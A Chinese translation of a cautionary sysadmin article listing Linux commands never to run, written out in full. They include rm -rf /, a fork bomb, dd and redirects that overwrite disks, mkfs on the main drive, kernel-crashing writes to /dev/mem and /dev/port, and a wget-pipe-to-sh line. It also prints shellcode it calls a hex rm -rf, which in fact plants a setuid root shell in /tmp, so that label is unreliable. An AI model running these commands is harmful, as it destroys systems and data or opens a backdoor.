<!DOCTYPE html>
<html lang="zh">
<head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="generator" content="Pelican" />
        <title>绝不要用的 Linux 命令！</title>
        <link rel="stylesheet" href="/theme/css/main.css" />
        <meta name="description" content="Author: Steven Vaughan-nichols 当然，除非你想干掉你的机器。 蜘蛛侠有这样的一句信条，“权力越大，责任越大。” 对于 Linux 系统管理员们来说，这也是一种 …" />
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">linux_cn</a></h1>
                <nav><ul>
                    <li><a href="/category/chuan-shan-jia-zhuan-fang">穿山甲专访</a></li>
                    <li><a href="/category/dai-ma-ying-xiong">代码英雄</a></li>
                    <li><a href="/category/fen-xiang">分享</a></li>
                    <li><a href="/category/guan-dian">观点</a></li>
                    <li><a href="/category/huo-dong">活动</a></li>
                    <li><a href="/category/ji-ke-man-hua">极客漫画</a></li>
                    <li class="active"><a href="/category/ji-zhu">技术</a></li>
                    <li><a href="/category/kai-yuan-zhi-hui">开源智慧</a></li>
                    <li><a href="/category/linux-fa-xing-ban">Linux 发行版</a></li>
                    <li><a href="/category/mei-ri-an-quan-zi-xun">每日安全资讯</a></li>
                    <li><a href="/category/misc">Misc</a></li>
                    <li><a href="/category/qu-kuai-lian">区块链</a></li>
                    <li><a href="/category/rong-qi-yu-yun">容器与云</a></li>
                    <li><a href="/category/ruan-jian-kai-fa">软件开发</a></li>
                    <li><a href="/category/shu-mei-pai">树莓派</a></li>
                    <li><a href="/category/xi-tong-yun-wei">系统运维</a></li>
                    <li><a href="/category/xin-wen">新闻</a></li>
                    <li><a href="/category/ying-he-guan-cha">硬核观察</a></li>
                    <li><a href="/category/zhi-ye-sheng-ya">职业生涯</a></li>
                    <li><a href="/category/zhong-jiang-ming-dan">中奖名单</a></li>
                    <li><a href="/category/zhuo-mian-ying-yong">桌面应用</a></li>
                </ul></nav>
        </header><!-- /#banner -->
<section id="content" class="body">
  <article>
    <header>
      <h1 class="entry-title">
        <a href="/2018/01/jue-bu-yao-yong-de-linux-ming-ling.html" rel="bookmark"
           title="Permalink to 绝不要用的 Linux 命令！">绝不要用的 Linux 命令！</a></h1>
    </header>

    <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2018-01-05T23:30:33+01:00">
                Published: Fri 05 January 2018
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/linux-fans-from-china.html">linux fans from china</a>
        </address>
<p>In <a href="/category/ji-zhu">技术</a>.</p>

</footer><!-- /.post-info -->      <p>Author: Steven Vaughan-nichols</p>
<p><img alt="" src="/data/attachment/album/201801/05/233039u88lsya3y2il7ll2.jpg"></p>
<p><strong>当然，除非你想干掉你的机器。</strong></p>
<p>蜘蛛侠有这样的一句信条，“权力越大，责任越大。” 对于 Linux 系统管理员们来说，这也是一种应当采用的明智态度。</p>
<p>不，真的，真心感谢 DevOps 的沟通协作和云编排技术，让一个 Linux 管理员不仅能掌控一台服务器，甚者能控制成千上万台服务器实例。只需要一个愚蠢的举动，你甚至可以毁掉一个价值数十亿美元的企业，就像 <a href="http://www.zdnet.com/article/equifax-blames-open-source-software-for-its-record-breaking-security-breach/">没有打补丁的 Apache Struts</a> 一样。</p>
<p>如果不能跑在安全补丁之前，这将会带来一个远超过系统管理员工资水平的战略性业务问题。这里就有一些足以搞死 Linux 服务器的简单方式掌握在系统管理员手中。很容易想象到，只有新手才会犯这些错误，但是，我们需要了解的更多。</p>
<p>下列是一些著名的命令，任何拥有 root 权限的用户都能借助它们对服务器造成严重破坏。</p>
<p><strong>警告：千万不要在生产环境运行这些命令，它们会危害你的系统。不要在家里尝试，也不要在办公室里测试。</strong></p>
<p>那么，继续！</p>
<h3>rm -rf /</h3>
<p>想要干脆利落的毁掉一个 Linux 系统吗？你无法超越这个被誉为“史上最糟糕”的经典，它能删除一切，我说的是，能删除所有存在你系统里的内容！</p>
<p>和大多数 <a href="https://www.hpe.com/us/en/insights/articles/16-linux-server-monitoring-commands-you-really-need-to-know-1703.html">Linux 命令</a>一样，<code>rm</code> 这个核心命令使用起来非常方便。即便是最顽固的文件它也能帮你删除。结合起后面两个参数理解 <code>rm</code> 指令时，你很容易陷入大麻烦：<code>-r</code>，强制递归删除所有子目录，<code>-f</code>，无需确认，强制删除所有只读文件。如果你在根目录运行这条指令，将清除整个驱动器上的所有数据。</p>
<p>如果你真这么干了，想想该怎么和老板解释吧！</p>
<p>现在，也许你会想，“我永远不会犯这么愚蠢的错误。”朋友，骄兵必败。吸取一下经验教训吧， <a href="https://www.reddit.com/r/sysadmin/comments/732skq/after_21_years_i_finally_made_the_rm_boo_boo/">这个警示故事来自于一个系统管理员在 Reddit 上的帖子</a>：</p>
<blockquote>
<p>我在 IT 界工作了很多年，但是今天，作为 Linux 系统 root 用户，我在错误的系统路径运行了 <code>rm- f</code></p>
<p>长话短说，那天，我需要复制一大堆目录从一个目录到另一个目录，和你一样，我敲了几个 <code>cp -R</code> 去复制我需要的内容。</p>
<p>以我的聪明劲，我持续敲着上箭头，在命令记录中寻找可以复制使用的类似命令名，但是它们混杂在一大堆其他命令当中。</p>
<p>不管怎么说，我一边在 Skype、Slack 和 WhatsApp 的网页上打字，一边又和 Sage 通电话，注意力严重分散，我在敲入 <code>rm -R ./videodir/* ../companyvideodirwith651vidsin/</code> 这样一条命令时神游物外。</p>
</blockquote>
<p>然后，当文件化为乌有时其中也包括了公司的视频。幸运的是，在疯狂敲击 <code>control -C</code> 后，在删除太多文件之前，系统管理员中止了这条命令。但这是对你的警告：任何人都可能犯这样的错误。</p>
<p>事实上，绝大部分现代操作系统都会在你犯这些错误之前，用一段醒目的文字警告你。然而，如果你在连续敲击键盘时忙碌或是分心，你将会把你的系统键入一个黑洞。（LCTT 译注：幸运的是，可能在根目录下删除整个文件系统的人太多了额，后来 <code>rm</code> 默认禁止删除根目录，除非——你手动加上 <code>--no-preserve-root</code> 参数！）</p>
<p>这里有一些更为隐蔽的方式调用 <code>rm -rf</code>。思考一下下面的代码：</p>
<div class="highlight"><pre><span></span><code>char esp[] __attribute__ ((section(“.text”))) = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
</code></pre></div>

<p>这是什么？这是 16 进制的 <code>rm -rf</code> 写法。在你不明确这段代码之前，请千万不要运行这条命令！</p>
<h3>fork 炸弹</h3>
<p>既然我们讨论的都是些奇怪的代码，不妨思考一下这一行：</p>
<div class="highlight"><pre><span></span><code>:(){ :|: &amp; };:
</code></pre></div>

<p>对你来说，这可能看起来有些神秘，但是我看来，它就是那个臭名昭著的 <a href="/article-5685-1.html">Bash fork 炸弹</a>。它会反复启动新的 Bash shell，直到你的系统资源消耗殆尽、系统崩溃。</p>
<p>不应该在最新的 Linux 系统上做这些操作。注意，我说的是<strong>不应该</strong>。我没有说<strong>不能</strong>。正确设置用户权限，Linux 系统能够阻止这些破坏性行为。通常用户仅限于分配使用机器可用内存。但是如果作为 root 用户的你运行了这行命令（或者它的变体 <a href="https://unix.stackexchange.com/questions/283496/why-do-these-bash-fork-bombs-work-differently-and-what-is-the-significance-of">Bash fork 炸弹变体</a>），你仍然可以反复虐待服务器，直到系统重启了。</p>
<h3>垃圾数据重写硬盘</h3>
<p>有时候你想彻底清除硬盘的数据，你应该使用 <a href="https://dban.org/">Darik's Boot and Nuke （DBAN）</a> 工具去完成这项工作。</p>
<p>但是如果仅仅想让你的存储器乱套，那很简单：</p>
<div class="highlight"><pre><span></span><code>任意命令 &gt; /dev/hda
</code></pre></div>

<p>我说的“任意命令”，是指有输出的任意命令，比如:</p>
<div class="highlight"><pre><span></span><code>ls -la &gt; /dev/hda
</code></pre></div>

<p>……将目录列表通过管道送到你的主存储设备。给我 root 权限和足够的时间，就能覆盖整个硬盘设备。这是让你开始盲目恐慌的一天的好办法，或者，可以把它变成 <a href="https://www.hpe.com/us/en/insights/articles/13-ways-to-tank-your-it-career-1707.html">职业禁入方式</a>。</p>
<h3>擦除硬盘！</h3>
<p>另一个一直受欢迎的擦除硬盘的方式是执行：</p>
<div class="highlight"><pre><span></span><code><span class="nv">dd</span><span class="w"> </span><span class="k">if</span><span class="o">=/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">zero</span><span class="w"> </span><span class="nv">of</span><span class="o">=/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">hda</span>
</code></pre></div>

<p>你可以用这条命令写入数据到你的硬盘设备。<code>dd</code> 命令可以从特殊文件中获取无尽个 <code>0</code> 字符，并且将它全部写入你的设备。</p>
<p>可能现在听起来 <code>/dev/zero</code> 是个愚蠢的想法，但是它真的管用。比如说，你可以使用它来 <a href="https://unix.stackexchange.com/questions/44234/clear-unused-space-with-zeros-ext3-ext4">用零清除未使用的分区空间</a>。它能使分区的镜像压缩到更小，以便于数据传输或是存档使用。</p>
<p>在另一方面，它和 <code>dd if=/dev/random of=/dev/hda</code> 相近，除了能毁掉你的一天之外，不是一个好事。如果你运行了这个指令（千万不要），你的存储器会被随机数据覆盖。作为一个隐藏你要接管办公室咖啡机的秘密计划的半吊子方法，倒是不错，但是你可以使用 DBAN 工具去更好的完成你的任务。</p>
<h3>/dev/null 的损失</h3>
<p>也许因为数据珍贵，我们对备份的数据没有什么信心，确实很多“永远不要这样做！”的命令都会导致硬盘或其它存储仓库的数据被擦除。一个鲜明的实例：另一个毁灭你的存储设备的方式，运行 <code>mv / /dev/null</code> 或者 <code>&gt;mv /dev/null</code>。</p>
<p>在前一种情况下，你作为 root 用户，把整个磁盘数据都送进这个如饥似渴的 <code>/dev/null</code>。在后者，你仅仅把家目录喂给这个空空如也的仓库。任何一种情况下，除非还原备份，你再也不会再看见你的数据了。</p>
<p>见鬼，难道会计真的不需要最新的应收账款文件了吗？</p>
<h3>格式化错了驱动器</h3>
<p>有时候你需要使用这一条命令格式化驱动器：</p>
<div class="highlight"><pre><span></span><code>mkfs.ext3 /dev/hda
</code></pre></div>

<p>……它会用 ext3 文件系统格式化主硬盘驱动器。别，请等一下！你正在格式化你的主驱动器！难道你不需要用它？</p>
<p>当你要格式化驱动器的时候，请务必加倍确认你正在格式化的分区是真的需要格式化的那块而不是你正在使用的那块，无论它们是 SSD、闪存盘还是其他氧化铁磁盘。</p>
<h3>内核崩溃</h3>
<p>一些 Linux 命令不能让你的机器长时间停机。然而，一些命令却可以导致内核崩溃。这些错误通常是由硬件问题引起的，但你也可以自己搞崩。</p>
<p>当你遭遇内核崩溃，重新启动系统你才可以恢复工作。在一些情况下，这只是有点小烦；在另一些情况下，这是一个大问题，比如说，高负荷运作下的生产环境。下面有一个案例：</p>
<div class="highlight"><pre><span></span><code><span class="nv">dd</span><span class="w"> </span><span class="k">if</span><span class="o">=/</span><span class="nv">dev</span><span class="o">/</span><span class="k">random</span><span class="w"> </span><span class="nv">of</span><span class="o">=/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">port</span>
<span class="nv">echo</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nv">proc</span><span class="o">/</span><span class="nv">sys</span><span class="o">/</span><span class="nv">kernel</span><span class="o">/</span><span class="nv">panic</span>
<span class="nv">cat</span><span class="w"> </span><span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">port</span>
<span class="nv">cat</span><span class="w"> </span><span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">zero</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">mem</span>
</code></pre></div>

<p>这些都会导致内核崩溃。</p>
<p>绝不要运行你并不了解它功能的命令，它们都在提醒我…</p>
<h3>提防未知脚本</h3>
<p>年轻或是懒惰的系统管理员喜欢复制别人的脚本。何必重新重复造轮子？所以，他们找到了一个很酷的脚本，承诺会自动检查所有备份。他们就这样运行它：</p>
<div class="highlight"><pre><span></span><code>wget https://ImSureThisIsASafe/GreatScript.sh -O- | sh
</code></pre></div>

<p>这会下载该脚本，并将它送到 shell 上运行。很明确，别大惊小怪，对吧？不对。这个脚本也许已经被恶意软件感染。当然，一般来说 Linux 比大多数操作系统都要安全，但是如果你以 root 用户运行未知代码，什么都可能会发生。这种危害不仅在恶意软件上，脚本作者的愚蠢本身同样有害。你甚至可能会因为一个未调试的代码吃上一堑——由于你没有花时间去读它。</p>
<p>你认为你不会干那样的事？告诉我，所有那些 <a href="https://www.oreilly.com/ideas/five-security-concerns-when-using-docker">你在 Docker 里面运行的容器镜像在干什么</a>？你知道它们到底在运行着什么吗？我见过太多的没有验证容器里面装着什么就运行它们的系统管理员。请不要和他们一样。</p>
<h3>结束</h3>
<p>这些故事背后的道理很简单。在你的 Linux 系统里，你有巨大的控制权。你几乎可以让你的服务器做任何事。但是在你使用你的权限的同时，请务必做认真的确认。如果你没有，你毁灭的不只是你的服务器，而是你的工作甚至是你的公司。像蜘蛛侠一样，负责任的使用你的权限。</p>
<p>我有没有遗漏什么？在 <a href="http://www.twitter.com/sjvn">@sjvn</a> 或 <a href="http://www.twitter.com/enterprisenxt">@enterprisenxt</a> 上告诉我哪些 Linux 命令在你的“<a href="https://www.youtube.com/watch?v=v79fYnuVzdI">绝不要运行！</a>”的清单上。</p>
    </div><!-- /.entry-content -->

  </article>
</section>
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>links</h2>
                        <ul>
                            <li><a href="https://getpelican.com/">Pelican</a></li>
                            <li><a href="https://www.python.org/">Python.org</a></li>
                            <li><a href="https://palletsprojects.com/p/jinja/">Jinja2</a></li>
                            <li><a href="#">You can modify those links in your config file</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>

                            <li><a href="#">You can add links in your config file</a></li>
                            <li><a href="#">Another social link</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a rel="nofollow" href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a rel="nofollow" href="https://www.python.org/">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a rel="nofollow" href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>